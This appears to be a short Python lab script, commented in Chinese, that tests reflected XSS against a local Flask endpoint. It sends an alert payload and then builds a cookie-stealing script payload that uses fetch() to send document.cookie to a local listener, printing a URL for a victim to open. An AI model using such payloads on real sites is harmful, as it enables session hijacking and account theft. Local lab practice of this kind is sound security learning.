import requests
import urllib.parse

url = "http://127.0.0.1:5000/xss"
# 1. 简单的弹窗payload
payload = "<script>alert('XSS')</script>"
params = {'name': payload}
response = requests.get(url, params=params)
print("XSS响应（包含payload）:")
print(response.text)  # 直接查看响应，可以看到payload被插入

# 2. 尝试窃取Cookie（模拟）：
# 实际攻击中，会向攻击者服务器发送Cookie
# 这里仅构造一个向本地监听的服务器发送请求的payload
steal_payload = "<script>fetch('http://127.0.0.1:8000/steal?cookie='+document.cookie)</script>"
params2 = {'name': steal_payload}
print("\n窃取Cookie的payload:", urllib.parse.unquote(steal_payload))
print("请在浏览器中访问以下URL（或使用requests但不会执行JS）:")
print(f"{url}?name={urllib.parse.quote(steal_payload)}")